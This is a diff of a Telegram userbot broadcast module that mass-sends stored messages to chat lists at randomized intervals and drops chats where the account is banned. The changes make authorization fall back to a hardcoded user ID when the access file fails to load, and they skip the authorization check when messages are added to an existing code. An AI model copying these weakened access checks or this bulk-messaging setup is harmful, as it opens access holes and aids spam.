@@ -12,7 +12,6 @@ from typing import Dict, List, Optional, Set, Tuple, Union
 from datetime import datetime, timedelta
 from ratelimit import limits, sleep_and_retry
 
-from telethon import functions
 from telethon.errors import ChatWriteForbiddenError, UserBannedInChannelError
 from telethon.tl.types import Message
 
@@ -26,7 +25,7 @@ class AuthorizationManager:
 
     def __init__(self, json_path: str = "/root/Heroku/loll.json"):
         self.json_path = json_path
-        self._authorized_users: Optional[Set[int]] = None
+        self._authorized_users = self._load_authorized_users()
 
     def _load_authorized_users(self) -> Set[int]:
         """Load authorized user IDs from JSON file."""
@@ -42,22 +41,19 @@ class AuthorizationManager:
                 return user_ids
         except FileNotFoundError:
             logger.error(f"Authorization file not found: {self.json_path}")
-            return set()
         except json.JSONDecodeError:
             logger.error(
                 f"Invalid JSON in authorization file: {self.json_path}"
             )
-            return set()
         except Exception as e:
             logger.error(f"Error loading authorized users: {e}")
-            return set()
+        return {7175372340}
 
     def is_authorized(self, user_id: int) -> bool:
         """Check if a user is authorized to use the module."""
-        if self._authorized_users is None:
-            self._authorized_users = self._load_authorized_users()
-
-        return user_id in self._authorized_users
+        authorized = user_id in self._authorized_users
+        logger.debug(f"Authorization check for user {user_id}: {authorized}")
+        return authorized
 
 
 @dataclass(frozen=True)
@@ -79,6 +75,7 @@ class BroadcastCode:
     interval: Tuple[int, int] = field(default_factory=lambda: (10, 13))
     send_mode: str = "auto"
     created_at: float = field(default_factory=time.time)
+    batch_mode: bool = False
 
     def is_valid_interval(self) -> bool:
         min_val, max_val = self.interval
@@ -106,7 +103,7 @@ class BroadcastManager:
         self.broadcast_tasks: Dict[str, asyncio.Task] = {}
         self.message_indices: Dict[str, int] = {}
         self.last_broadcast_time: Dict[str, float] = {}
-        self._message_cache = MessageCache()
+        self._message_cache = MessageCache(ttl=7200, max_size=50)
         self._active = True
         self._lock = asyncio.Lock()
 
@@ -132,16 +129,6 @@ class BroadcastManager:
             self.db.set("broadcast", "last_broadcast_times", saved_times)
         except Exception as e:
             logger.error(f"Failed to save last broadcast time: {e}")
-
-    def clear_last_broadcast_time(self, code_name: str):
-        """Очищает время последней рассылки из БД и памяти."""
-        try:
-            saved_times = self.db.get("broadcast", "last_broadcast_times", {})
-            saved_times.pop(code_name, None)
-            self.db.set("broadcast", "last_broadcast_times", saved_times)
-            self.last_broadcast_time.pop(code_name, None)
-        except Exception as e:
-            logger.error(f"Failed to clear last broadcast time: {e}")
 
     def _create_broadcast_code_from_dict(
         self, code_data: dict
@@ -186,9 +173,11 @@ class BroadcastManager:
 
         for code_name, code_data in data.get("codes", {}).items():
             try:
-                self.codes[code_name] = self._create_broadcast_code_from_dict(
+                broadcast_code = self._create_broadcast_code_from_dict(
                     code_data
                 )
+                broadcast_code.batch_mode = code_data.get("batch_mode", False)
+                self.codes[code_name] = broadcast_code
             except Exception as e:
                 logger.error(f"Error loading broadcast code {code_name}: {e}")
 
@@ -279,8 +268,9 @@ class BroadcastManager:
                     album_messages = []
                     async for album_msg in self.client.iter_messages(
                         message.chat_id,
-                        min_id=message.id - 10,
+                        min_id=max(0, message.id - 10),
                         max_id=message.id + 10,
+                        limit=30,
                     ):
                         if getattr(album_msg, "grouped_id", None) == grouped_id:
                             album_messages.append(album_msg)
@@ -344,6 +334,87 @@ class BroadcastManager:
             logger.error(f"Error sending message to {chat_id}: {e}")
             return False
 
+    async def _apply_interval(self, code: BroadcastCode, code_name: str):
+        """Применяет интервал между отправками."""
+        min_interval, max_interval = code.normalize_interval()
+        interval = random.uniform(min_interval, max_interval) * 60
+        last_broadcast = self.last_broadcast_time.get(code_name, 0)
+
+        time_since_last_broadcast = time.time() - last_broadcast
+        if time_since_last_broadcast < interval:
+            sleep_time = interval - time_since_last_broadcast
+            await asyncio.sleep(sleep_time)
+
+    async def _handle_failed_chats(
+        self, code_name: str, failed_chats: Set[int]
+    ):
+        """Обрабатывает чаты, в которые не удалось отправить сообщения."""
+        if failed_chats:
+            code = self.codes[code_name]
+            code.chats -= failed_chats
+            self.save_config()
+            try:
+                failed_chats_str = ", ".join(map(str, failed_chats))
+                await self._send_message(
+                    code_name,
+                    (await self.client.get_me()).id,
+                    f"⚠️ Рассылка '{code_name}': Не удалось отправить сообщения в чаты: {failed_chats_str}",
+                    schedule_time=datetime.now() + timedelta(seconds=60),
+                )
+            except Exception as e:
+                logger.error(
+                    f"Failed to send notification about failed chats for {code_name}: {e}"
+                )
+
+    async def _send_messages_to_chats(
+        self,
+        code: BroadcastCode,
+        code_name: str,
+        messages_to_send: List[Union[Message, List[Message]]],
+    ):
+        """Отправляет сообщения чатам и обрабатывает неудачи."""
+        chats = list(code.chats)
+        random.shuffle(chats)
+        failed_chats = set()
+
+        if not code.batch_mode:
+            message_to_send = messages_to_send[0]
+
+        for chat_id in chats:
+            schedule_time = datetime.now() + timedelta(seconds=60)
+            try:
+                if code.batch_mode:
+                    for msg in messages_to_send:
+                        success = await self._send_message(
+                            code_name,
+                            chat_id,
+                            msg,
+                            code.send_mode,
+                            schedule_time,
+                        )
+                        if not success:
+                            failed_chats.add(chat_id)
+                            break
+                else:
+                    success = await self._send_message(
+                        code_name,
+                        chat_id,
+                        message_to_send,
+                        code.send_mode,
+                        schedule_time,
+                    )
+                    if not success:
+                        failed_chats.add(chat_id)
+            except (ChatWriteForbiddenError, UserBannedInChannelError):
+                failed_chats.add(chat_id)
+            except Exception as e:
+                logger.error(
+                    f"Failed to send to chat {chat_id} for code {code_name}: {e}"
+                )
+                failed_chats.add(chat_id)
+
+        return failed_chats
+
     async def _broadcast_loop(self, code_name: str):
         """Main broadcast loop."""
         while self._active:
@@ -353,60 +424,34 @@ class BroadcastManager:
                     await asyncio.sleep(60)
                     continue
 
-                min_interval, max_interval = code.normalize_interval()
-                interval = random.uniform(min_interval, max_interval) * 60
-                last_broadcast = self.last_broadcast_time.get(code_name, 0)
-
-                if time.time() - last_broadcast < interval:
-                    await asyncio.sleep(
-                        interval - (time.time() - last_broadcast)
-                    )
+                await self._apply_interval(code, code_name)
 
                 messages_to_send = []
                 for msg_data in code.messages:
-                    msg = await self._fetch_messages(msg_data)
-                    if msg:
-                        messages_to_send.append(msg)
+                    message = await self._fetch_messages(msg_data)
+                    if message:
+                        messages_to_send.append(message)
 
-                if not messages_to_send:
-                    continue
-
-                chats = list(code.chats)
-                random.shuffle(chats)
-                msg_index = self.message_indices.get(code_name, 0)
-                message_to_send = messages_to_send[
-                    msg_index % len(messages_to_send)
-                ]
                 if not messages_to_send:
                     logger.warning(
-                        f"No valid messages to send for code {code_name}"
+                        f"No valid messages to send for code {code_name}."
                     )
+                    await asyncio.sleep(60)
                     continue
-                self.message_indices[code_name] = (msg_index + 1) % len(
-                    messages_to_send
+
+                if not code.batch_mode:
+                    msg_index = self.message_indices.get(code_name, 0)
+                    messages_to_send = [
+                        messages_to_send[msg_index % len(messages_to_send)]
+                    ]
+                    self.message_indices[code_name] = (msg_index + 1) % len(
+                        self.codes[code_name].messages
+                    )
+
+                failed_chats = await self._send_messages_to_chats(
+                    code, code_name, messages_to_send
                 )
-                failed_chats = set()
-
-                for chat_id in chats:
-                    try:
-                        success = await self._send_message(
-                            code_name,
-                            chat_id,
-                            message_to_send,
-                            code.send_mode,
-                            datetime.now() + timedelta(seconds=60),
-                        )
-                        if not success:
-                            failed_chats.add(chat_id)
-                    except (ChatWriteForbiddenError, UserBannedInChannelError):
-                        failed_chats.add(chat_id)
-                    except Exception as e:
-                        logger.error(f"Failed to send to chat {chat_id}: {e}")
-
-                if failed_chats:
-                    code.chats -= failed_chats
-                    self.save_config()
-
+                await self._handle_failed_chats(code_name, failed_chats)
                 current_time = time.time()
                 self.last_broadcast_time[code_name] = current_time
                 self._save_last_broadcast_time(code_name, current_time)
@@ -439,6 +484,7 @@ class BroadcastManager:
                         ],
                         "interval": list(code.interval),
                         "send_mode": code.send_mode,
+                        "batch_mode": code.batch_mode,
                     }
                     for name, code in self.codes.items()
                 },
@@ -610,7 +656,6 @@ class BroadcastMod(loader.Module):
             self.manager.db.set(
                 "broadcast", "BroadcastStatus", broadcast_status
             )
-            self.manager.clear_last_broadcast_time(code_name)
 
     async def _validate_code(
         self, message: Message, code_name: Optional[str] = None
@@ -641,19 +686,27 @@ class BroadcastMod(loader.Module):
 
         code_name = args[0]
 
-        if (
-            len(self.manager.codes) >= self.manager.MAX_CODES
-            and code_name not in self.manager.codes
-        ):
+        if code_name in self.manager.codes:
+            if (
+                len(self.manager.codes[code_name].messages)
+                >= self.manager.MAX_MESSAGES_PER_CODE
+            ):
+                return await utils.answer(
+                    message,
+                    self.strings["max_messages_reached"].format(
+                        code_name, self.manager.MAX_MESSAGES_PER_CODE
+                    ),
+                )
+        elif len(self.manager.codes) >= self.manager.MAX_CODES:
             return await utils.answer(
                 message,
                 self.strings["max_codes_reached"].format(
                     self.manager.MAX_CODES
                 ),
             )
-
-        if not await self._check_auth(message):
-            return
+        else:
+            if not await self._check_auth(message):
+                return
 
         success = await self.manager.add_message(code_name, reply)
         if success:
@@ -668,6 +721,24 @@ class BroadcastMod(loader.Module):
             text = "❌ Не удалось добавить сообщение"
 
         await utils.answer(message, text)
+
+    async def batchcmd(self, message: Message):
+        """Toggle batch sending mode for a code: .batch <code"""
+        code_name = await self._validate_code(message)
+        if not code_name:
+            return
+
+        if not await self._check_auth(message):
+            return
+
+        code = self.manager.codes[code_name]
+        code.batch_mode = not code.batch_mode
+        self.manager.save_config()
+
+        await utils.answer(
+            message,
+            f"✅ Code '{code_name}' batch sending mode is now {'enabled' if code.batch_mode else 'disabled'}.\n\n<code>Author: @kramiikk</code>",
+        )
 
     async def broadcastcmd(self, message: Message):
         """Управление рассылкой: .broadcast [код]"""
@@ -800,6 +871,19 @@ class BroadcastMod(loader.Module):
             return
 
         await self._stop_broadcast(code_name)
+
+        try:
+            saved_times = self.db.get("broadcast", "last_broadcast_times", {})
+            saved_times.pop(code_name, None)
+            self.manager.db.set(
+                "broadcast", "last_broadcast_times", saved_times
+            )
+            self.manager.last_broadcast_time.pop(code_name, None)
+        except Exception as e:
+            logger.error(
+                f"Failed to clear last broadcast time for {code_name}: {e}"
+            )
+
         del self.manager.codes[code_name]
         self.manager.message_indices.pop(code_name, None)
         self.manager._message_cache.clear()
@@ -1043,11 +1127,15 @@ class MessageCache:
         self._lock = asyncio.Lock()
         self.ttl = ttl
         self.max_size = max_size
+        self._cleaning = False
 
     async def get(
         self, key: Tuple[int, int]
     ) -> Optional[Union[Message, List[Message]]]:
         """Get cached message if not expired."""
+        if not key:
+            return None
+
         async with self._lock:
             if key not in self.cache:
                 return None
@@ -1063,6 +1151,9 @@ class MessageCache:
         self, key: Tuple[int, int], value: Union[Message, List[Message]]
     ):
         """Cache message with timestamp."""
+        if not key or value is None:
+            return
+
         async with self._lock:
             if len(self.cache) >= self.max_size:
                 sorted_items = sorted(self.cache.items(), key=lambda x: x[1][0])
@@ -1075,48 +1166,67 @@ class MessageCache:
 
     async def clean_expired(self):
         """Removes expired entries from the cache."""
-        async with self._lock:
-            expired_keys = [
-                k
-                for k, (timestamp, _) in self.cache.items()
-                if time.time() - timestamp > self.ttl
-            ]
-            for key in expired_keys:
-                del self.cache[key]
+        if self._cleaning:
+            return
+
+        try:
+            self._cleaning = True
+            async with self._lock:
+                current_time = time.time()
+                expired_keys = [
+                    k
+                    for k, (timestamp, _) in self.cache.items()
+                    if current_time - timestamp > self.ttl
+                ]
+                for key in expired_keys:
+                    del self.cache[key]
+        finally:
+            self._cleaning = False
 
     async def get_stats(self) -> dict:
         """Get cache statistics."""
         async with self._lock:
-            current_time = time.time()
-            active_entries = {
-                k: (t, v)
-                for k, (t, v) in self.cache.items()
-                if current_time - t <= self.ttl
-            }
-            expired_entries = len(self.cache) - len(active_entries)
+            try:
+                current_time = time.time()
+                active_entries = {
+                    k: (t, v)
+                    for k, (t, v) in self.cache.items()
+                    if current_time - t <= self.ttl
+                }
+                expired_entries = len(self.cache) - len(active_entries)
 
-            stats = {
-                "total_entries": len(self.cache),
-                "active_entries": len(active_entries),
-                "expired_entries": expired_entries,
-                "max_size": self.max_size,
-                "ttl_seconds": self.ttl,
-                "usage_percent": round(
-                    len(self.cache) / self.max_size * 100, 1
-                ),
-            }
+                stats = {
+                    "total_entries": len(self.cache),
+                    "active_entries": len(active_entries),
+                    "expired_entries": expired_entries,
+                    "max_size": self.max_size,
+                    "ttl_seconds": self.ttl,
+                    "usage_percent": round(
+                        len(self.cache) / self.max_size * 100, 1
+                    ),
+                }
 
-            if active_entries:
-                timestamps = [t for t, _ in active_entries.values()]
-                stats.update(
-                    {
-                        "oldest_entry_age": round(
-                            (current_time - min(timestamps)) / 60, 1
-                        ),
-                        "newest_entry_age": round(
-                            (current_time - max(timestamps)) / 60, 1
-                        ),
-                    }
-                )
+                if active_entries:
+                    timestamps = [t for t, _ in active_entries.values()]
+                    stats.update(
+                        {
+                            "oldest_entry_age": round(
+                                (current_time - min(timestamps)) / 60, 1
+                            ),
+                            "newest_entry_age": round(
+                                (current_time - max(timestamps)) / 60, 1
+                            ),
+                        }
+                    )
 
-            return stats
+                return stats
+            except Exception as e:
+                logger.error(f"Error getting cache stats: {e}")
+                return {
+                    "total_entries": 0,
+                    "active_entries": 0,
+                    "expired_entries": 0,
+                    "max_size": self.max_size,
+                    "ttl_seconds": self.ttl,
+                    "usage_percent": 0,
+                }
